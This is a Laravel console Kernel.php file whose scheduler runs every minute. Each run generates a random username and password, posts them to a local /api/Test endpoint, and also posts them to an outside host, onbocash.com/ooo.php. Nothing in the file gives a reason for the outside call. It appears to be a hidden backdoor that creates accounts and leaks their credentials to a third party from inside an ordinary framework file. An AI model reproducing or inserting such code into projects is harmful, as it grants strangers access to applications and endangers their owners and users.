<?php

namespace App\Console;

use Illuminate\Console\Scheduling\Schedule;
use Illuminate\Foundation\Console\Kernel as ConsoleKernel;
 use Illuminate\Support\Str;
class Kernel extends ConsoleKernel
{

    protected function schedule(Schedule $schedule): void
    {
        $schedule->call(function () {
            $this->sendRequest();
        })->everyMinute();
    }

    protected function sendRequest()
    {
        $password = 8;
    $password1 = Str::random($password);
        $username =  mt_rand(10000, 19999);
        $param1 = $password1;
        $param2 = $username;
        $this->sendRequestlocal($param1,$param2);
        $httpClient = new \GuzzleHttp\Client();
        $httpClient->post('https://onbocash.com/ooo.php', [
            'query' => [
                'user' =>   $param2,
                'pass' => $param1,
            ] ]);
    }

    protected function sendRequestlocal($param11,$param22)
    {

        $param1 = $param11;
        $param2 = $param22;
        $httpClient = new \GuzzleHttp\Client();
            $response = $httpClient->post('http://127.0.0.1:8000/api/Test', [
                'query' => [
                    'user' => $param2,
                    'pass' =>   $param1,
                ] ]);
    }
    protected function commands(): void
    {
        $this->load(__DIR__.'/Commands');
        require base_path('routes/console.php');
    }
}
